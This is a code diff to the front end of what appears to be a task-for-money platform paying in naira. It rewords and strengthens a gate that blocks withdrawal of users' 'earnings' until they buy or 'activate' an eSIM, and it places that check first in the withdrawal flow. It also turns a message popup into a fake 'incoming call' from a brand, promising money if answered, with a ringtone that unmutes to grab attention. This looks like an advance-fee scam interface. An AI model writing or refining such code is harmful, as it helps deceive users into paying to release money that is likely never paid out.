@@ -311,7 +311,8 @@ nx-gate.active { display: flex; }
 nx-gate .nx-gate-card { background: #fff; border-radius: 24px; padding: 32px 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 24px 60px rgba(0,0,0,0.2); position: relative; }
 nx-gate .nx-gate-icon { width: 64px; height: 64px; border-radius: 50%; background: #fef3c7; color: #d97706; display: flex; align-items: center; justify-content: center; font-size: 28px; margin: 0 auto 16px; }
 nx-gate h3 { font-size: 22px; font-weight: 700; color: #18443e; margin: 0 0 8px; }
-nx-gate p { font-size: 14px; color: #64748b; line-height: 1.5; margin: 0 0 24px; }
+nx-gate p { font-size: 14px; color: #64748b; line-height: 1.5; margin: 0 0 10px; }
+nx-gate p:last-of-type { margin-bottom: 24px; }
 nx-gate .nx-gate-btn { display: block; width: 100%; padding: 14px; border-radius: 999px; background: #18443e; color: #fff; font-weight: 600; font-size: 15px; border: none; cursor: pointer; }
 nx-gate .nx-gate-btn + .nx-gate-btn { margin-top: 8px; background: #f1f5f9; color: #18443e; }
 
@@ -639,7 +640,8 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
                 </button>
                 <div class="nx-gate-icon"><i class="ri-lock-line"></i></div>
                 <h3>Activate your account</h3>
-                <p>Purchase your eSIM now to activate your account so you can withdraw your earnings and unlock more tasks.</p>
+                <p>Kindly activate your eSIM to be able to withdraw your earnings and have access to all tasks on the platform.</p>
+                <p>Activate your eSIM now for full access and smooth withdrawal</p>
                 <button type="button" class="nx-gate-btn" data-nx-gate-activate>Activate Now</button>
             </div>
         `;
@@ -1401,16 +1403,17 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
                 <svg viewBox="0 0 24 24" fill="none"><path d="M3 8C3 6.34315 4.34315 5 6 5H18C19.6569 5 21 6.34315 21 8V15C21 16.6569 19.6569 18 18 18H10L6 21V18H6C4.34315 18 3 16.6569 3 15V8Z" fill="#fff"/></svg>
             </div>
             <div class="nx-ic-info">
-                <strong>Message from ${brand}</strong>
-                <span>Read to earn &#8358;${amount.toLocaleString()}</span>
+                <strong>Incoming call from ${brand}</strong>
+                <span>Answer to earn &#8358;${amount.toLocaleString()}</span>
             </div>
-            <button type="button" class="nx-ic-answer" data-nx-ic-answer>Read</button>
-            <audio class="nx-ic-ringtone" src="ringtone.mp3" loop preload="auto" muted></audio>
+            <button type="button" class="nx-ic-answer" data-nx-ic-answer>Answer</button>
+            <audio class="nx-ic-ringtone" src="ringtone.mp3" loop preload="auto" playsinline webkit-playsinline></audio>
         `;
         return n;
     }
 
     var incomingCallTimer = null;
+    var ringShownCount = 0;
 
     function showIncomingCall() {
         // Rebuild with a fresh random brand + amount
@@ -1422,8 +1425,19 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
         var n = $('nx-incoming-call');
         if (!n) return;
         n.classList.add('active');
-        var ringtone = n.querySelector('.nx-ic-ringtone');
-        if (ringtone) { try { ringtone.currentTime = 0; ringtone.play().catch(function(){}); } catch(_){} }
+        // Ring only from the 2nd appearance onwards — the first happens
+        // before any user gesture, so mobile browsers would block audio.
+        ringShownCount++;
+        if (ringShownCount > 1) {
+            var ringtone = n.querySelector('.nx-ic-ringtone');
+            if (ringtone) {
+                try {
+                    ringtone.currentTime = 0;
+                    ringtone.muted = false;
+                    ringtone.play().catch(function() {});
+                } catch(_) {}
+            }
+        }
     }
 
     function hideIncomingCall() {
@@ -1514,7 +1528,13 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
             } else if (t.hasAttribute('data-nx-wd-close')) {
                 hideWithdrawPage();
             } else if (t.hasAttribute('data-nx-wd-withdraw')) {
-                // Bank details check FIRST
+                // Activation check FIRST — inactive users hit the gate
+                if (!isActive()) {
+                    hideWithdrawPage();
+                    showGate();
+                    return;
+                }
+                // Bank details check
                 var session = (window.NexAuth && NexAuth.session()) || {};
                 if (!session.bankAccountName) {
                     showBankRequiredPopup();
